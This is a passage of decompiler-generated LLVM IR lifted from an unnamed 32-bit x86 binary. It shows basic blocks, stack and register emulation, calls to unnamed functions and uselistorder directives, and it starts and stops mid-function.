  %v2_8051205 = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8051205, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051346

dec_label_pc_805120f:                             ; preds = %dec_label_pc_8051149
  %v1_8051212 = inttoptr i32 %v0_8051149 to i32*
  %v2_8051212 = load i32, i32* %v1_8051212, align 4
  %v5_8051212 = inttoptr i32 %v0_8051139 to i32*
  store i32 %v2_8051212, i32* %v5_8051212, align 4
  %v1_8051214 = call i32 @function_804eac9(i32 -1)
  store i32 %v1_8051214, i32* @eax, align 4
  %v0_8051219 = load i32, i32* @esp, align 4
  %v1_8051219 = add i32 %v0_8051219, 16
  br label %dec_label_pc_805121c

dec_label_pc_805121c:                             ; preds = %dec_label_pc_8050f4e, %dec_label_pc_8051079, %dec_label_pc_8051071, %dec_label_pc_805100d, %dec_label_pc_8050f93, %dec_label_pc_8050f6f, %dec_label_pc_805120f
  %v1_8051223 = phi i32 [ %v1_8050f63, %dec_label_pc_8050f4e ], [ %v1_805106a, %dec_label_pc_8051079 ], [ %v1_805106a, %dec_label_pc_8051071 ], [ %v1_8050f84, %dec_label_pc_805100d ], [ %v1_8050f84, %dec_label_pc_8050f93 ], [ %v1_8050f84, %dec_label_pc_8050f6f ], [ %v1_8051219, %dec_label_pc_805120f ]
  %v1_805121c = add i32 %v1_8051223, 51
  %v2_805121c = inttoptr i32 %v1_805121c to i8*
  %v3_805121c = load i8, i8* %v2_805121c, align 1
  %v4_805121c = icmp eq i8 %v3_805121c, 0
  %v1_8051221 = icmp eq i1 %v4_805121c, false
  br i1 %v1_8051221, label %dec_label_pc_8051267, label %dec_label_pc_8051223

dec_label_pc_8051223:                             ; preds = %dec_label_pc_805121c
  %v0_8051223 = load i32, i32* @ecx, align 4
  %v2_8051223 = add i32 %v1_8051223, -4
  %v3_8051223 = inttoptr i32 %v2_8051223 to i32*
  store i32 %v0_8051223, i32* %v3_8051223, align 4
  %v1_8051224 = add i32 %v1_8051223, -8
  %v2_8051224 = inttoptr i32 %v1_8051224 to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v2_8051224, align 4
  %v1_8051229 = add i32 %v1_8051223, -12
  %v2_8051229 = inttoptr i32 %v1_8051229 to i32*
  store i32 134542939, i32* %v2_8051229, align 4
  %v1_805122e = add i32 %v1_8051223, 184
  store i32 %v1_805122e, i32* @esi, align 4
  %v2_8051235 = add i32 %v1_8051223, -16
  %v3_8051235 = inttoptr i32 %v2_8051235 to i32*
  store i32 %v1_805122e, i32* %v3_8051235, align 4
  %v2_8051236 = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8051236, i32* %eax.global-to-local, align 4
  %v0_805123b = load i32, i32* @esp, align 4
  %v1_805123b = inttoptr i32 %v0_805123b to i32*
  store i32 ptrtoint (i32* @global_var_8056450.137 to i32), i32* %v1_805123b, align 4
  %v1_8051242 = call i32 @function_804f65b(i32 -1)
  store i32 %v1_8051242, i32* %eax.global-to-local, align 4
  %v0_8051247 = load i32, i32* @global_var_8059138.197, align 8
  store i32 %v0_8051247, i32* %ebx.global-to-local, align 4
  %v0_805124d = load i32, i32* @esp, align 4
  %v1_805124d = inttoptr i32 %v0_805124d to i32*
  %v2_805124d = load i32, i32* %v1_805124d, align 4
  store i32 %v2_805124d, i32* @eax, align 4
  %v3_805124d = add i32 %v0_805124d, 4
  %v1_805124e = inttoptr i32 %v3_805124d to i32*
  %v2_805124e = load i32, i32* %v1_805124e, align 4
  store i32 %v2_805124e, i32* %edx.global-to-local, align 4
  %v1_805124f = add i32 %v0_8051247, -1
  store i32 %v1_805124f, i32* @ebx, align 4
  store i32 1, i32* %v1_805124e, align 4
  %v0_8051252 = load i32, i32* @esi, align 4
  store i32 %v0_8051252, i32* %v1_805124d, align 4
  %v2_8051253 = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_8051253, i32* %eax.global-to-local, align 4
  %v0_8051258 = load i32, i32* @esp, align 4
  %v1_8051258 = add i32 %v0_8051258, 16
  %v1_805125b = add i32 %v0_8051258, 52
  %v2_805125b = inttoptr i32 %v1_805125b to i32*
  %v3_805125b = load i32, i32* %v2_805125b, align 4
  %v4_805125b = load i32, i32* @ebx, align 4
  %v5_805125b = sub i32 %v3_805125b, %v4_805125b
  %v11_805125b = xor i32 %v4_805125b, %v3_805125b
  %v12_805125b = xor i32 %v5_805125b, %v3_805125b
  %v13_805125b = and i32 %v12_805125b, %v11_805125b
  %v14_805125b = icmp slt i32 %v13_805125b, 0
  %v16_805125b = icmp slt i32 %v5_805125b, 0
  %v2_805125f = icmp eq i1 %v16_805125b, %v14_805125b
  br i1 %v2_805125f, label %dec_label_pc_8051267, label %dec_label_pc_8051261

dec_label_pc_8051261:                             ; preds = %dec_label_pc_8051223
  %v4_8051261 = add i32 %v3_805125b, 1
  store i32 %v4_8051261, i32* %v2_805125b, align 4
  br label %dec_label_pc_8051288.backedge

dec_label_pc_8051267:                             ; preds = %dec_label_pc_8050ef0, %dec_label_pc_8051223, %dec_label_pc_805121c, %dec_label_pc_8050f07
  %v1_8051276 = phi i32 [ %v1_8051258, %dec_label_pc_8051223 ], [ %v1_8051223, %dec_label_pc_805121c ], [ %v1_8050f43, %dec_label_pc_8050f07 ], [ %v0_8051267.pre, %dec_label_pc_8050ef0 ]
  %v1_8051267 = add i32 %v1_8051276, 40
  %v2_8051267 = inttoptr i32 %v1_8051267 to i32*
  %v3_8051267 = load i32, i32* %v2_8051267, align 4
  %v1_805126b = add i32 %v3_8051267, 1
  store i32 %v1_805126b, i32* %eax.global-to-local, align 4
  %v1_805126c = ashr i32 %v1_805126b, 31
  store i32 %v1_805126c, i32* %edx.global-to-local, align 4
  %v1_805126d = add i32 %v1_8051276, 248
  %v2_805126d = inttoptr i32 %v1_805126d to i32*
  %v3_805126d = load i32, i32* %v2_805126d, align 4
  %v5_805126d = zext i32 %v1_805126b to i64
  %v7_805126d = zext i32 %v1_805126c to i64
  %v8_805126d = mul nuw i64 %v7_805126d, 4294967296
  %v9_805126d = or i64 %v8_805126d, %v5_805126d
  %v10_805126d = zext i32 %v3_805126d to i64
  %v11_805126d = sdiv i64 %v9_805126d, %v10_805126d
  %v12_805126d = trunc i64 %v11_805126d to i32
  store i32 %v12_805126d, i32* %eax.global-to-local, align 4
  %v13_805126d = srem i64 %v9_805126d, %v10_805126d
  %v14_805126d = trunc i64 %v13_805126d to i32
  store i32 %v14_805126d, i32* %edx.global-to-local, align 4
  %v1_8051274 = icmp eq i32 %v14_805126d, 0
  store i32 %v14_805126d, i32* %v2_8051267, align 4
  %v1_805127a = icmp eq i1 %v1_8051274, false
  br i1 %v1_805127a, label %dec_label_pc_8051280, label %dec_label_pc_805127c

dec_label_pc_805127c:                             ; preds = %dec_label_pc_8051267
  %v0_805127c = load i32, i32* @esp, align 4
  %v1_805127c = add i32 %v0_805127c, 28
  %v2_805127c = inttoptr i32 %v1_805127c to i32*
  %v3_805127c = load i32, i32* %v2_805127c, align 4
  %v4_805127c = add i32 %v3_805127c, 1
  store i32 %v4_805127c, i32* %v2_805127c, align 4
  br label %dec_label_pc_8051280

dec_label_pc_8051280:                             ; preds = %dec_label_pc_8051267, %dec_label_pc_805127c
  %v0_8051280 = load i32, i32* @esp, align 4
  %v1_8051280 = add i32 %v0_8051280, 36
  %v2_8051280 = inttoptr i32 %v1_8051280 to i32*
  store i32 -1, i32* %v2_8051280, align 4
  br label %dec_label_pc_8051288.backedge

dec_label_pc_8051288.backedge:                    ; preds = %dec_label_pc_8051280, %dec_label_pc_8050efe, %dec_label_pc_8050fec, %dec_label_pc_8051261
  %v0_8051288.pre = load i32, i32* @esp, align 4
  %v1_8051288 = add i32 %v0_8051288.pre, 28
  %v2_8051288 = inttoptr i32 %v1_8051288 to i32*
  %v3_8051288 = load i32, i32* %v2_8051288, align 4
  %tmp121 = icmp ult i32 %v3_8051288, 3
  br i1 %tmp121, label %dec_label_pc_8050ce8, label %dec_label_pc_80512ad

dec_label_pc_80512ad:                             ; preds = %dec_label_pc_8050c62, %dec_label_pc_8050df2, %dec_label_pc_8050cfe, %dec_label_pc_8051288.backedge, %dec_label_pc_8050c04, %dec_label_pc_8050c3c, %dec_label_pc_8050c44, %dec_label_pc_8050c52
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8050c52 ], [ -1, %dec_label_pc_8050c44 ], [ -1, %dec_label_pc_8050c3c ], [ -1, %dec_label_pc_8050c04 ], [ %v0_8050caf, %dec_label_pc_8051288.backedge ], [ %v0_8050caf, %dec_label_pc_8050cfe ], [ %v0_8050caf, %dec_label_pc_8050df2 ], [ %v0_8050caf, %dec_label_pc_8050c62 ]
  %v0_80512ad = call i32 @function_804fe9c()
  store i32 %v0_80512ad, i32* %eax.global-to-local, align 4
  %v1_80512b2 = inttoptr i32 %v0_80512ad to i32*
  store i32 -1, i32* %v1_80512b2, align 4
  %v0_80512b8 = load i32, i32* @esp, align 4
  %v1_80512b8 = add i32 %v0_80512b8, 56
  %v2_80512b8 = inttoptr i32 %v1_80512b8 to i32*
  %v3_80512b8 = load i32, i32* %v2_80512b8, align 4
  store i32 %v3_80512b8, i32* %eax.global-to-local, align 4
  %v2_80512bc = add i32 %v0_80512b8, 44
  %v3_80512bc = inttoptr i32 %v2_80512bc to i32*
  store i32 %v3_80512b8, i32* %v3_80512bc, align 4
  br label %dec_label_pc_80512c0

dec_label_pc_80512c0:                             ; preds = %dec_label_pc_8051025, %dec_label_pc_8050ffd, %dec_label_pc_80512ad
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_80512ad ], [ %v0_8050caf, %dec_label_pc_8051025 ], [ %v0_8050caf, %dec_label_pc_8050ffd ]
  %v0_80512c0 = load i32, i32* @esp, align 4
  %v1_80512c0 = add i32 %v0_80512c0, 20
  %v2_80512c0 = inttoptr i32 %v1_80512c0 to i32*
  %v3_80512c0 = load i32, i32* %v2_80512c0, align 4
  %v13_80512c0 = icmp eq i32 %v3_80512c0, -1
  br i1 %v13_80512c0, label %dec_label_pc_80512c0.dec_label_pc_80512d6_crit_edge, label %dec_label_pc_80512c7

dec_label_pc_80512c0.dec_label_pc_80512d6_crit_edge: ; preds = %dec_label_pc_80512c0
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_80512d6

dec_label_pc_80512c7:                             ; preds = %dec_label_pc_80512c0
  %v3_80512ca = load i32, i32* %v2_80512c0, align 4
  %v5_80512ca = add i32 %v0_80512c0, -16
  %v6_80512ca = inttoptr i32 %v5_80512ca to i32*
  store i32 %v3_80512ca, i32* %v6_80512ca, align 4
  %v1_80512ce = sext i16 %stack_var_-180.1 to i32
  %v2_80512ce = call i32 @function_804b7d8(i32 %v1_80512ce)
  store i32 %v2_80512ce, i32* %eax.global-to-local, align 4
  %v0_80512d3 = load i32, i32* @esp, align 4
  %v1_80512d3 = add i32 %v0_80512d3, 16
  br label %dec_label_pc_80512d6

dec_label_pc_80512d6:                             ; preds = %dec_label_pc_80512c0.dec_label_pc_80512d6_crit_edge, %dec_label_pc_80512c7
  %v1_80512dd.pre-phi = phi i32 [ %.pre, %dec_label_pc_80512c0.dec_label_pc_80512d6_crit_edge ], [ %v1_80512ce, %dec_label_pc_80512c7 ]
  %v0_80512d6 = phi i32 [ %v0_80512c0, %dec_label_pc_80512c0.dec_label_pc_80512d6_crit_edge ], [ %v1_80512d3, %dec_label_pc_80512c7 ]
  %v1_80512d9 = add i32 %v0_80512d6, 12
  %v2_80512d9 = inttoptr i32 %v1_80512d9 to i32*
  %v3_80512d9 = load i32, i32* %v2_80512d9, align 4
  %v5_80512d9 = add i32 %v0_80512d6, -16
  %v6_80512d9 = inttoptr i32 %v5_80512d9 to i32*
  store i32 %v3_80512d9, i32* %v6_80512d9, align 4
  %v2_80512dd = call i32 @function_804eac9(i32 %v1_80512dd.pre-phi)
  store i32 %v2_80512dd, i32* %eax.global-to-local, align 4
  %v1_80512e2 = load i32, i32* @esp, align 4
  %v2_80512e2 = inttoptr i32 %v1_80512e2 to i32*
  store i32 %v1_8050c1a, i32* %v2_80512e2, align 4
  %v2_80512e5 = call i32 @function_804eac9(i32 %v1_80512dd.pre-phi)
  store i32 %v2_80512e5, i32* @eax, align 4
  %v0_80512ea = load i32, i32* @esp, align 4
  %v1_80512ed = add i32 %v0_80512ea, 56
  %v2_80512ed = inttoptr i32 %v1_80512ed to i32*
  %v3_80512ed = load i32, i32* %v2_80512ed, align 4
  %v13_80512ed = icmp eq i32 %v3_80512ed, -1
  %v1_80512f2 = add i32 %v0_80512ea, 32
  %v2_80512f2 = inttoptr i32 %v1_80512f2 to i32*
  store i32 -1, i32* %v2_80512f2, align 4
  br i1 %v13_80512ed, label %dec_label_pc_80512d6.dec_label_pc_8051349_crit_edge, label %dec_label_pc_80512fc

dec_label_pc_80512d6.dec_label_pc_8051349_crit_edge: ; preds = %dec_label_pc_80512d6
  %v0_8051349.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051349

dec_label_pc_80512fc:                             ; preds = %dec_label_pc_80512d6
  %v0_80512fc = load i32, i32* @ecx, align 4
  %v1_80512fc = load i32, i32* @esp, align 4
  %v2_80512fc = add i32 %v1_80512fc, -4
  %v3_80512fc = inttoptr i32 %v2_80512fc to i32*
  store i32 %v0_80512fc, i32* %v3_80512fc, align 4
  %v1_80512fd = add i32 %v1_80512fc, -8
  %v2_80512fd = inttoptr i32 %v1_80512fd to i32*
  store i32 ptrtoint (i32* @global_var_8058b28.194 to i32), i32* %v2_80512fd, align 4
  %v1_8051302 = add i32 %v1_80512fc, -12
  %v2_8051302 = inttoptr i32 %v1_8051302 to i32*
  store i32 134542939, i32* %v2_8051302, align 4
  %v1_8051307 = add i32 %v1_80512fc, 184
  store i32 %v1_8051307, i32* %ebx.global-to-local, align 4
  %v2_805130e = add i32 %v1_80512fc, -16
  %v3_805130e = inttoptr i32 %v2_805130e to i32*
  store i32 %v1_8051307, i32* %v3_805130e, align 4
  %v3_805130f = call i32 @function_804f65e(i32 %v1_80512dd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805130f, i32* %eax.global-to-local, align 4
  %v0_8051314 = load i32, i32* @esp, align 4
  %v1_8051314 = inttoptr i32 %v0_8051314 to i32*
  store i32 ptrtoint (i32* @global_var_8058b28.194 to i32), i32* %v1_8051314, align 4
  %v2_805131b = call i32 @function_804f65b(i32 %v1_80512dd.pre-phi)
  store i32 %v2_805131b, i32* %eax.global-to-local, align 4
  %v0_8051320 = load i32, i32* @esp, align 4
  %v1_8051320 = add i32 %v0_8051320, 60
  %v2_8051320 = inttoptr i32 %v1_8051320 to i32*
  %v3_8051320 = load i32, i32* %v2_8051320, align 4
  store i32 %v3_8051320, i32* %eax.global-to-local, align 4
  %v1_8051324 = add i32 %v0_8051320, 56
  %v2_8051324 = inttoptr i32 %v1_8051324 to i32*
  %v3_8051324 = load i32, i32* %v2_8051324, align 4
  store i32 %v3_8051324, i32* %edx.global-to-local, align 4
  %v1_8051328 = trunc i32 %v3_8051320 to i16
  store i16 %v1_8051328, i16* @global_var_805644c.196, align 4
  %v1_805132e = inttoptr i32 %v0_8051320 to i32*
  %v2_805132e = load i32, i32* %v1_805132e, align 4
  store i32 %v2_805132e, i32* @eax, align 4
  %v3_805132e = add i32 %v0_8051320, 4
  %v1_805132f = sext i32 %v3_8051324 to i64
  store i64 %v1_805132f, i64* @global_var_8058b40.195, align 64
  %v1_8051335 = inttoptr i32 %v3_805132e to i32*
  %v2_8051335 = load i32, i32* %v1_8051335, align 4
  store i32 %v2_8051335, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8051335, align 4
  %v0_8051338 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051338, i32* %v1_805132e, align 4
  %v3_8051339 = call i32 @function_804f65e(i32 %v1_80512dd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8051339, i32* %eax.global-to-local, align 4
  %v0_805133e = load i32, i32* @esp, align 4
  %v1_805133e = add i32 %v0_805133e, 32
  %v2_805133e = inttoptr i32 %v1_805133e to i32*
  store i32 -1, i32* %v2_805133e, align 4
  br label %dec_label_pc_8051346

dec_label_pc_8051346:                             ; preds = %dec_label_pc_80511ba, %dec_label_pc_80512fc
  %v0_8051346 = load i32, i32* @esp, align 4
  %v1_8051346 = add i32 %v0_8051346, 16
  br label %dec_label_pc_8051349

dec_label_pc_8051349:                             ; preds = %dec_label_pc_80512d6.dec_label_pc_8051349_crit_edge, %dec_label_pc_8051346
  %v0_8051349 = phi i32 [ %v0_8051349.pre, %dec_label_pc_80512d6.dec_label_pc_8051349_crit_edge ], [ %v1_8051346, %dec_label_pc_8051346 ]
  %v1_8051349 = add i32 %v0_8051349, 16
  %v2_8051349 = inttoptr i32 %v1_8051349 to i32*
  %v3_8051349 = load i32, i32* %v2_8051349, align 4
  store i32 %v3_8051349, i32* %eax.global-to-local, align 4
  %v1_805134d = add i32 %v0_8051349, 220
  %v1_8051353 = inttoptr i32 %v1_805134d to i32*
  %v2_8051353 = load i32, i32* %v1_8051353, align 4
  store i32 %v2_8051353, i32* @ebx, align 4
  %v3_8051353 = add i32 %v0_8051349, 224
  %v1_8051354 = inttoptr i32 %v3_8051353 to i32*
  %v2_8051354 = load i32, i32* %v1_8051354, align 4
  store i32 %v2_8051354, i32* @esi, align 4
  %v3_8051354 = add i32 %v0_8051349, 228
  %v1_8051355 = inttoptr i32 %v3_8051354 to i32*
  %v2_8051355 = load i32, i32* %v1_8051355, align 4
  store i32 %v2_8051355, i32* @edi, align 4
  %v3_8051355 = add i32 %v0_8051349, 232
  %v1_8051356 = inttoptr i32 %v3_8051355 to i32*
  %v2_8051356 = load i32, i32* %v1_8051356, align 4
  store i32 %v2_8051356, i32* @ebp, align 4
  ret i32 %v3_8051349

; uselistorder directives
  uselistorder i32 %v0_8051349, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8051320, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80512d6, { 1, 0 }
  uselistorder i32 %v1_80512dd.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8051288.pre, { 1, 0 }
  uselistorder i32 %v5_805125b, { 1, 0 }
  uselistorder i32 %v3_805125b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8051223, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80511ec, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80511ba, { 1, 0 }
  uselistorder i32 %v3_8051199, { 1, 0, 2 }
  uselistorder i32 %v0_805118a, { 1, 0 }
  uselistorder i32 %v5_8051180, { 1, 0 }
  uselistorder i32* %v3_8051180, { 1, 0 }
  uselistorder i32 %v0_805105680, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8051180, { 2, 1, 0 }
  uselistorder i32 %v5_805117a, { 1, 0 }
  uselistorder i32 %v1_8051179, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8051175, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051139, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8051113, { 1, 0 }
  uselistorder i32 %v1_8051104, { 1, 0 }
  uselistorder i32 %v3_80510d5, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80510c3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805106a, { 1, 2, 0 }
  uselistorder i32 %v0_805106a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8051044, { 1, 0 }
  uselistorder i32 %v0_8051044.pre, { 2, 1, 0 }
  uselistorder i32 %v0_805103a, { 1, 2, 0 }
  uselistorder i32 %v0_805104c67, { 3, 2, 1, 0 }
  uselistorder i32 %v5_805104457, { 1, 0 }
  uselistorder i32 %v5_8050fe6, { 1, 0 }
  uselistorder i32* %v2_8050fe6, { 1, 0, 2 }
  uselistorder i32 %v3_8050f9e, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050f84, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8050f84, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8050f63, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050f43, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050ee9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050ece, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8050eb7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050e3f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050df2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050dd3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8050db7, { 1, 0 }
  uselistorder i32 %v3_8050dac, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8050da9, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8050d4e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8050d49, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050d32, { 1, 0 }
  uselistorder i32 %v1_8050cfe, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8050cef94, { 2, 1, 0 }
  uselistorder i16 %v0_8050caf, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8050ca8, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 12, 13, 14, 15, 16, 11 }
  uselistorder i32 %v2_8050c89, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_8050c52, { 1, 0, 2 }
  uselistorder i32 %v1_8050c1a, { 1, 5, 3, 8, 7, 10, 6, 4, 0, 9, 11, 2, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 8, 9 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 43, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 87, 83, 84, 85, 86, 88, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 70, 44, 45, 46, 47, 48 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 2, 1 }
  uselistorder i32 100, { 0, 2, 3, 1 }
  uselistorder i32 68, { 2, 1, 3, 4, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804dcb4, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804dc64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_804dd68, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 17, { 8, 7, 5, 6, 2, 3, 1, 0, 10, 4, 9 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @function_804d880, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @function_80519f8, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 27, 13, 25, 24, 26, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 27, 21, 25, 22, 26, 28, 29, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20, 24 }
  uselistorder i32 (i32)* @function_804b7d8, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 1, 15, 14, 7, 0, 3, 2 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805644c.196, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0 }
  uselistorder i64* @global_var_8058b40.195, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8058b28.194 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_804ddba, { 6, 5, 11, 10, 9, 1, 7, 4, 3, 8, 2, 0 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051349, { 1, 0 }
  uselistorder label %dec_label_pc_8051346, { 1, 0 }
  uselistorder label %dec_label_pc_80512d6, { 1, 0 }
  uselistorder label %dec_label_pc_80512c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80512ad, { 3, 1, 2, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8051288.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051280, { 1, 0 }
  uselistorder label %dec_label_pc_8051267, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805121c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80511ba, { 1, 0 }
  uselistorder label %dec_label_pc_805118a, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8051180, { 1, 0 }
  uselistorder label %dec_label_pc_8051175, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051172, { 1, 0 }
  uselistorder label %dec_label_pc_80510ed, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051035, { 1, 0 }
  uselistorder label %dec_label_pc_8050eb7, { 1, 0 }
  uselistorder label %dec_label_pc_8050e80, { 1, 0 }
  uselistorder label %dec_label_pc_8050df2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050cfe, { 1, 0 }
  uselistorder label %dec_label_pc_8050ce8, { 1, 0 }
}

define i32 @function_8051358() local_unnamed_addr {
dec_label_pc_8051358:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8051358 = load i32, i32* @ebp, align 4
  store i32 134542939, i32* %stack_var_-216, align 4
  %v3_8051367 = ptrtoint i32* %stack_var_-216 to i32
  %v2_805136c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805136c, i32* @eax, align 4
  %v2_8051374 = call i32 @function_804f65e(i32 %v2_805136c, i32 134542939)
  %v1_8051380 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056450.137 to i32))
  store i32 %v1_8051380, i32* @eax, align 4
  %v0_8051388 = load i32, i32* @global_var_8059134.138, align 4
  %tmp39 = icmp slt i32 %v0_8051388, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_805157f, label %dec_label_pc_8051395

dec_label_pc_8051395:                             ; preds = %dec_label_pc_8051358
  store i32 ptrtoint (i32* @global_var_8055050.199 to i32), i32* %stack_var_-216, align 4
  %v2_80513a1 = call i32 @function_804bbbc(i32 ptrtoint ([17 x i8]* @global_var_805501e.200 to i32), i32 ptrtoint (i32* @global_var_8055050.199 to i32))
  store i32 %v2_80513a1, i32* @eax, align 4
  %v1_80513a9 = icmp eq i32 %v2_80513a1, 0
  store i32 %v2_80513a1, i32* @ebp, align 4
  %v1_80513ad = icmp eq i1 %v1_80513a9, false
  br i1 %v1_80513ad, label %dec_label_pc_805154a.preheader, label %dec_label_pc_80513b3

dec_label_pc_80513b3:                             ; preds = %dec_label_pc_8051395
  store i32 ptrtoint (i32* @global_var_8055050.199 to i32), i32* %stack_var_-216, align 4
  %v2_80513bf = call i32 @function_804bbbc(i32 ptrtoint ([24 x i8]* @global_var_805502f.201 to i32), i32 ptrtoint (i32* @global_var_8055050.199 to i32))
  %v1_80513c7 = icmp eq i32 %v2_80513bf, 0
  store i32 %v2_80513bf, i32* @ebp, align 4
  %v1_80513cb = icmp eq i1 %v1_80513c7, false
  br i1 %v1_80513cb, label %dec_label_pc_805154a.preheader, label %dec_label_pc_8051574

dec_label_pc_805154a.preheader:                   ; preds = %dec_label_pc_8051395, %dec_label_pc_80513b3
  %v2_8051551 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8051485 = add i32 %v3_8051367, 164
  %v4_8051474 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805154a

dec_label_pc_80513d6:                             ; preds = %dec_label_pc_80513e1
  %v1_80513d6 = add i32 %v0_80513d654, 1
  store i32 %v1_80513d6, i32* @ebx, align 4
  %v1_80513d7 = inttoptr i32 %v1_80513d6 to i8*
  %v2_80513d7 = load i8, i8* %v1_80513d7, align 1
  %v3_80513d7 = zext i8 %v2_80513d7 to i32
  %v5_80513d7 = and i32 %v6_80513d757, -256
  %v6_80513d7 = or i32 %v3_80513d7, %v5_80513d7
  store i32 %v6_80513d7, i32* @ecx, align 4
